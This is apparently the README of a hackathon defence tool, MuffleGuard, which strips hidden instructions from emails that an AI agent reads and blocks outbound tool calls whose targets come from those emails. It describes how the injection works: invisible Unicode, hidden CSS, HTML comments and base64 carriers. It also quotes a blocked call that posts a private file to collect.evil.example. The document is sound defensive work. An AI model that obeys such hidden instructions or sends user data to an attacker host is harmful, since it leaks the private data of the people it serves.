# MuffleGuard

A guard that sits between an AI agent and its tools. It muffles instructions
hidden in the content the agent reads, and refuses any action whose target was
chosen by that content rather than by the user.

Built for TatHack '26, Track 2 (Safe & Trustworthy AI).

> Your AI agent can read the attacker's email. MuffleGuard makes sure it can't obey it.

## The problem

An agent that reads email and can send it has everything an attacker needs: it
reads text the attacker wrote, it holds data worth stealing, and it can send
things out. An instruction hidden in an email is read by the model exactly like
one from the user.

## How it works

Two layers, so that one miss is not a breach.

**Detect and muffle.** Hidden carriers (invisible Unicode, white-on-white CSS,
HTML comments, base64) are decoded and removed. Optional CPU classifiers can
flag sentences addressed to the model rather than to the user. Only those
sentences are removed, so the rest of the email still reaches the agent.

**Data-flow policy.** Before any outbound tool call runs, every target is traced
back to where it came from. One invariant decides it:

> An outbound tool call may only act on a target the user chose,
> unless a human approves it.

No model is consulted, so there is nothing to argue out of it. A target found
only in an email is refused and the refusal names the email. A target found
nowhere goes to a human. Separately, recognized secrets and copied excerpts
from private tool results are blocked in outbound tool arguments. A request-level
`ASK` also stops before the first model call; the caller must resolve it before
starting a new run.

Every decision is written to a hash-chained SQLite log. A separately recorded
head makes deleting the last row detectable while the database metadata remains
intact.

Live demo: **https://attack-lab-production.up.railway.app**

## Try it

```bash
python -m venv .venv && .venv/Scripts/python -m pip install -r requirements-dev.txt
cp .env.example .env            # add an OpenAI-compatible key
.venv/Scripts/python -m pytest  # no network needed
.venv/Scripts/python tools/hero_attack.py --no-muffle
```

Or open the Attack Lab in a browser:

```bash
.venv/Scripts/python -m uvicorn web.app:app --port 8000
```

Both runs appear side by side, streamed as they happen, with the injected
sentences struck through and every refusal carrying the line that explains it.
The audit viewer will edit one of its own entries on request, so verification
can be seen catching it (set `DEMO_TAMPER=1`).

The built-in request uses a fixed synthetic response replay, so the comparison
works offline. Custom requests use the configured provider when a key and daily
call allowance are available.

Sentence classifiers are off by default. Pass `--detector` after placing both
ONNX model snapshots in the local Hugging Face cache; MuffleGuard does not
download weights automatically. See [REVIEW.md](REVIEW.md) for setup. BPE
tokenizer files are checked for unsafe merge layouts before the native parser
loads them. The audit log is in memory by default for the demo. Set
`MUFFLEGUARD_AUDIT_PATH` to a writable SQLite file path to retain it across
process restarts.

`hero_attack.py` runs the same request twice. Undefended, the agent obeys an
email that nobody can see and posts a private file to the attacker. Defended
with every content defence switched off, the model still obeys, and the policy
engine refuses the call:

```
BLOCK http_post(url='https://collect.evil.example/u', ...)
      The url 'collect.evil.example' came from email #5 from hr@corp.example, not from you.
```

## What is not claimed

- The audit log is tamper-**evident**, not tamper-proof: anyone who can write
  the database can rewrite both the chain and its recorded head. Detecting a
  malicious rewrite or deletion of the head itself needs an external checkpoint
  or signing key the writer does not hold.
- URL provenance checks the host name only. It does not bind scheme, port, path,
  DNS result, or redirect destination; real network adapters need an egress
  allowlist and SSRF protections.
- An address the user pastes into their own request is trusted, because they
  chose it.
- Detection thresholds are not yet tuned: "please ignore my last email" is
  currently flagged. Measured on held-out data in the next phase.
- The egress checks are heuristics. They catch known secret formats and copied
  runs of three or more meaningful words, but not every encoding or paraphrase.

## Privacy and integration limits

The guard checks calls from the model to tools. The configured model provider
still receives the user's request and each tool result sent back to the model;
only use data that provider is approved to process. The general `LLM` client does
not cache responses by default. `hero_attack.py` opts into its local response
cache for the synthetic demo; `--no-cache` disables it. Cache responses may
contain user data, so keep live data out of the demo cache and out of Git.

The audit log stores decisions and reason text, not full tool results or the
content removed by muffling. Reasons and source labels can still contain
addresses or file names; restrict access to persistent logs and set a retention
period that fits your use.

The shipped inbox, file, web and outbound tools operate on an in-memory fake
world. A real integration needs its own access control, URL/SSRF protections,
and deployment review; this demo does not implement those service boundaries.

Reviewing this? See [REVIEW.md](REVIEW.md).

Known gaps are asserted as they behave in `tests/test_redteam.py`.

## Credits

| What | Licence |
| --- | --- |
| [protectai/deberta-v3-base-prompt-injection-v2](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2) | Apache-2.0 |
| [Horizon-Labs/prompt-injection-guard-small](https://huggingface.co/Horizon-Labs/prompt-injection-guard-small) | Apache-2.0 |
| [onnxruntime](https://onnxruntime.ai/), [tokenizers](https://github.com/huggingface/tokenizers), [numpy](https://numpy.org/) | MIT / Apache-2.0 / BSD-3 |
| [httpx](https://www.python-httpx.org/) | BSD-3 |
| [pytest](https://pytest.org/), [Hypothesis](https://hypothesis.works/) | MIT / MPL-2.0 |
| Agent model via [OpenRouter](https://openrouter.ai/) | provider terms |

The Verhoeff and Luhn checksums are implemented from their published
definitions. The sandbox inbox, files and attacks are written by us; no real
account or personal data is used anywhere.

## AI usage

Developed with Claude Code (Claude Opus) used for pair programming: design
discussion, drafting modules and tests, and adversarial review. Every design
decision, the security model and the threat model are the team's own, and each
member can explain the code they own. The demo video is recorded by a person.

## Team

- Mohith Akshay Duggirala — [@Trafalgar-2006](https://github.com/Trafalgar-2006)
- [@samdoglover](https://github.com/samdoglover)

Licensed under Apache-2.0.
